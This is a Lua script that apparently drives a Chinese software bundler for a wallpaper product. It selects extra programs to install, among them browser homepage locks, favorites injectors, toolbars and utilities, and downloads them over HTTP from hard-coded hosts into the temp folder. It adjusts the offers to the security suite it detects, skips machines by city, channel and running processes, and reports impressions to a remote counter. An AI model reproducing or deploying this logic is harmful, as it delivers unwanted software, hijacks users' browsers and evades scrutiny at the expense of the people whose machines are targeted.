require("unicorn")
require("extra")

project = "jcbz"
function report_kunbang(name, p1, p2, p3, p4, p5, p6, p7)
	extra.report_kunbang(project, name, p1, p2, p3, p4, p5, p6, p7)
end

function taskid_last_time(value)
	return extra.taskid_last_time(project, value)
end

function save_taskid(value)
	extra.save_taskid(project, value)
end

function qid()
	return extra.qid(project)
end

function uid()
	return extra.uid(project)
end

function version()
	return extra.version(project)
end

function md5()
	return extra.md5(project)
end

function city_name()
	return extra.city_name(project)
end

function first_install_time()
	return extra.first_install_time(project)
end

function nopop_set_time(value)
	return extra.nopop_set_time(project, value)
end

function printf(value)
	unicorn.printf(value .. "\n")
end

--安装间隔天数/近期不弹/最小间隔天数判断，返回结果结果为天数直接判断大小
function interval(timestamp, difftype)
	local today =
		os.time({year = os.date("%Y", os.time()), month = os.date("%m", os.time()), day = os.date("%d", os.time())})
	local otherday =
		os.time({year = os.date("%Y", timestamp), month = os.date("%m", timestamp), day = os.date("%d", timestamp)})
	local day = math.floor(os.difftime(today, otherday) / 86400)
	local hour = math.floor(os.difftime(os.time(), timestamp) / 3600)
	if difftype == nil then
		return math.abs(day)
	elseif string.lower(difftype) == "d" then
		return math.abs(day)
	elseif string.lower(difftype) == "h" then
		return math.abs(hour)
	else
		return math.abs(day)
	end
end

function report_onday(value, from)
	if interval(taskid_last_time(value)) < 1 then
		return
	else
		report_kunbang(value, true, true, true, true, 0, from, true)
		save_taskid(value)
		return
	end
end

function is_xp()
	if unicorn.system_info.v1 == 5 then
		return true
	else
		return false
	end
end

function table_maxn(t)
	local mn = 1
	for k, v in pairs(t) do
		if (type(k) ~= "number") then
			mn = 0
		end
	end
	return mn
end

function table2json(t)
	local function serialize(tbl)
		local tmp = {}
		for k, v in pairs(tbl) do
			local k_type = type(k)
			local v_type = type(v)
			local key = (k_type == "string" and '"' .. k .. '":') or (k_type == "number" and "")
			local value =
				(v_type == "table" and serialize(v)) or (v_type == "boolean" and tostring(v)) or
				(v_type == "string" and '"' .. v .. '"') or
				(v_type == "number" and v)
			tmp[#tmp + 1] = key and value and tostring(key) .. tostring(value) or nil
		end
		if table_maxn(tbl) == 0 then
			return "{" .. table.concat(tmp, ",") .. "}"
		else
			return "[" .. table.concat(tmp, ",") .. "]"
		end
	end
	assert(type(t) == "table")
	return serialize(t)
end

--匹配数组内元素,value=搜索词,array=被搜索数组,searchtype不填写或写0为前置匹配,其他为全词匹配
function stringinarray(value, array, searchtype)
	if searchtype == nil or searchtype == 0 then
		-- 前置匹配
		for k, v in ipairs(array) do
			local pos = string.find(string.upper(value), string.upper(v))
			if (pos == 1) then
				return true
			end
		end
		return false
	else
		--全词匹配
		for k, v in ipairs(array) do
			if (string.upper(v) == string.upper(value)) then
				return true
			end
		end
		return false
	end
end

--检查不弹环境,输入上报前缀及不弹列表
function check_enviroment(exclude_list)
	-- 检查渠道号
	if stringinarray(qid(),exclude_list.qid) then
		return false
	end
	-- 检查版本号
	if stringinarray(version(),exclude_list.version) then
		return false
	end
	-- 检查md5
	if stringinarray(md5(),exclude_list.md5,1) then
		return false
	end
	-- 检查城市
	if stringinarray(city_name(),exclude_list.citys,1) then
		return false
	end
	-- 检查进程名
	for k,v in ipairs(exclude_list.process)
	do 
		if stringinarray(v,unicorn.process,1)
		then
			return false
		end
	end
	return true
end

--控量检查,控量到则返回true,控量没到则返回false
function klcheck(name, count)
	local a = unicorn.web_http_get("http://xhapi.7654.com/showcountnew.php?param=show&name=" .. name)
	if tonumber(a) < count then
		unicorn.web_http_get("http://xhapi.7654.com/showcountnew.php?name=" .. name)
		return false
	else
		return true
	end
end

function is_exist(type, value)
	if type == "desktopfile" then
		if unicorn.file_exists(0, value) == true or unicorn.file_exists(19, value) == true then
			return true
		else
			return false
		end
	elseif type == "reg" then
		local start_i, end_j, substr = string.find(value, "(.-)/")
		local rootkey = (substr == "HKEY_LOCAL_MACHINE" and "HKLM") or (substr == "HKEY_CURRENT_USER" and "HKCU")
		local subkey = string.gsub(string.gsub(value, "(.-/)", "", 1), "/", "\\\\")
		return unicorn.reg_key_exist(rootkey, subkey)
	end
end

function soft_list_get(softs)
	local soft = {}
	local soft_list = {}
	local is_insert = true
	for k, v in pairs(softs) do
		is_insert = true
		soft = source_list(v)
		if soft ~= nil then
			if soft.detail.reg ~= nil and is_exist("reg", soft.detail.reg) == true then
				is_insert = false
			elseif soft.detail.desktopfile ~= nil and is_exist("desktopfile", soft.detail.desktopfile) == true then
				is_insert = false
			end
			if soft.maxshowcount ~= nil then
				if klcheck(soft.count_name, soft.maxshowcount) == true then
					is_insert = false
				end
			end
			if soft.detail.reg ~= nil and is_insert == true then
				soft.detail.reg = string.gsub(soft.detail.reg, "/", "\\\\")
			end
		else
			is_insert = false
		end
		if is_insert == true then
			table.insert(soft_list, soft.detail)
		end
		if #soft_list == 3 then
			return soft_list
		end
	end
	return soft_list
end

function source_list(display)
	if display == "7654浏览器" then
		if is_xp() == true then
			return nil
		end
	end

	local soft_source = {
		["收藏夹"] = {
			name = "bz002-scj-001",
			display = (is360 == true and "收藏夹") or ("天猫收藏夹"),
			url = "http://down1.wallpaper.muxin.fun/tui/llqfavorites/zm/sh_helper_jcwallpaper_fav.7z",
			installtype = 1
		},
		["锁首"] = {
			name = "bz002-zyws-001",
			display = (is360 == true and "360导航") or ("7654导航"),
			url = "http://down1.wallpaper.muxin.fun/tui/llqfavorites/zm/sh_helper_jcwallpaper_lock.7z",
			installtype = 1
		},
		["收藏夹锁首"] = {
			name = "bz002-scjzyws-001",
			display = ((is360 ~= true and isqq ~= true and isjs ~= true) and "工具栏") or ("天猫收藏夹"),
			url = "http://down1.wallpaper.muxin.fun/tui/llqfavorites/zm/sh_helper_jcwallpaper.7z",
			installtype = 1
		},
		["小新记事本dll"] = {
            name = "bz002-jsb003-001",
            display = "小新记事本",
			url = "http://down1.calfwallpaper.shqingzao.com/Uploads/v1.0.3.4/CalfWallpaper_4288826543_jc_001.7z",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/xinnote",
			installtype = 1
		},
		["光速搜索"] = {
			name = "bz002-sousuo001-001",
			display = "光速搜索",
			url = "http://cdnfinder.shzhanmeng.com/jc_1/finder_4288826543_jc_001.exe",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/Finder",
			installtype = 0
		},
		["小象壁纸dll"] = {
            name = "bz002-bz001-001",
            display = "小象壁纸",
			url = "http://down2.7654browser.shzhanmeng.com/Uploads/v3.1.1.0/7654Browser_3221699395_kz_002.7z",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/CalfWallpaper",
			installtype = 1
		},
		["云朵工具栏"] = {
            name = "bz002-gjl001-001",
            display = "云朵工具栏",
			url = "http://down1.698283.vip/Uploads/v1.0.1.9/clouds_setup_3862877336_kt_001.7z",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/CloudsToolbar",
			installtype = 1
		},
		["ABC看图dll"] = {
			name = "bz002-kt001-001",
			display = "ABC看图",
			url = "http://down1.abckantu.com/Uploads/v3.2.0.6/PhotoViewer_Setup_2527841996_jcbzkt_001.7z",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/PhotoViewer",
			installtype = 1
		}
	}
	--[[
		count_name = "",
		maxshowcount = 100,
	]]
	local soft = {
		detail = {
			name = soft_source[display].name,
			display = soft_source[display].display,
			url = soft_source[display].url,
			save_path = "%temp%\\\\jcbz\\\\" .. string.gsub(soft_source[display].url, ".*/", ""),
			installtype = soft_source[display].installtype
		}
	}
	if soft_source[display].reg ~= nil then
		soft.detail.reg = soft_source[display].reg
	elseif soft_source[display].desktopfile ~= nil then
		soft.detail.desktopfile = soft_source[display].desktopfile
	end
	if soft_source[display].count_name ~= nil then
		soft.maxshowcount = soft_source[display].maxshowcount
		soft.count_name = soft_source[display].count_name
	end
	if soft_source[display].command ~= nil then
		soft.detail.command = soft_source[display].command
	end
	return soft
end

function kunbang_360()
	local softs = {"收藏夹",
					"锁首",
					"小象壁纸dll",
					"云朵工具栏"
				}
	return {software = soft_list_get(softs)}
end

function kunbang_js()
	local softs = {"小新记事本dll",
					"旋风PDF", 
					"小象壁纸dll"
				}
	return {software = soft_list_get(softs)}
end

function kunbang_qq()
	local softs = {"小新记事本dll",
				"7654浏览器dll", 
				"小象壁纸dll"
			}
	return {software = soft_list_get(softs)}
end

function kunbang_qt()
	local softs = {"收藏夹锁首",
					"小象壁纸dll",
					"云朵工具栏",
					"小新记事本dll"
				}
	return {software = soft_list_get(softs)}
end

function main()
	local aresult = {}
	if is360 == true then
		aresult = kunbang_360()
	elseif isjs == true then
		aresult = kunbang_js()
	elseif isqq == true then
		aresult = kunbang_qq()
	else
		aresult = kunbang_qt()
	end

	if isqq == true then
		aresult.skin = "http://down1.wallpaper.muxin.fun/tui/tui_decodex.zip"
	else
		aresult.skin = "http://down1.wallpaper.muxin.fun/tui/tui_decode-wx.zip"	
	end
	result = table2json(aresult)
	printf(result)
	return
end

--全局变量定义
nowtime=os.date("%H:%M")
nowtime1 = os.date("%Y-%m-%d")
day = os.date("%d")
wekd = os.date("%w")                        --[0 - 6 = 星期天 - 星期六]
p_version = version()
p_qid = qid()
p_uid = uid()
p_city = city_name()
p_first_install_time = first_install_time()
is360 = extra.safe_soft.safe360
isqq = extra.safe_soft.qqpc
isjs = extra.safe_soft.jinshan

main()
